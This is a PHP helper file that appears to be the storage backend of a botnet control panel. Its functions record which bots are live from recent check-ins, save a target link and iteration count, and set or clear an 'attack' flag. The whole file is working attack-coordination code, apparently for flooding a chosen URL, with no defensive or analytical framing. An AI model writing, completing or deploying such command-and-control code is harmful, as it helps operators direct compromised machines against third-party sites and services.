<?php

$data_file = 'data.db';
$data = file_get_contents($data_file);

function getAllData()
{
    $data = unserialize($GLOBALS['data']);
    return $data;
}

function saveAllData($allData)
{
    $allData = serialize($allData);
    file_put_contents($GLOBALS['data_file'], $allData);
}

function getBotsData()
{
    $data = getAllData();
    return $data['bots'];
}

function saveBotData($all_bot_data)
{
    $all_data = getAllData();
    $all_data['bots'] = $all_bot_data;
    saveAllData($all_data);
}

function getLiveBots()
{
    $all_bot_data = getBotsData();

    $flag = 0;
    foreach($all_bot_data as $bot_id => $time) {
        if((time()-$time) >= 100)
            unset($all_bot_data[$bot_id]);
    }
    return $all_bot_data;
}

function saveLinkAndIter($link, $iter)
{
    $allData = getAllData();
    $allData['link'] = $link;
    $allData['iter'] = $iter;
    $allData['attack'] = '1';
    saveAllData($allData);
}

function stopAttack()
{
    $allData = getAllData();
    $allData['attack'] = '0';
    saveAllData($allData);
}

function getIterValue()
{
    $allData = getAllData();
    return $allData['iter'];
}

function getAttackValue()
{
    $allData = getAllData();
    return $allData['attack'];
}

function getLinkValue()
{
    $allData = getAllData();
    return $allData['link'];
}

?>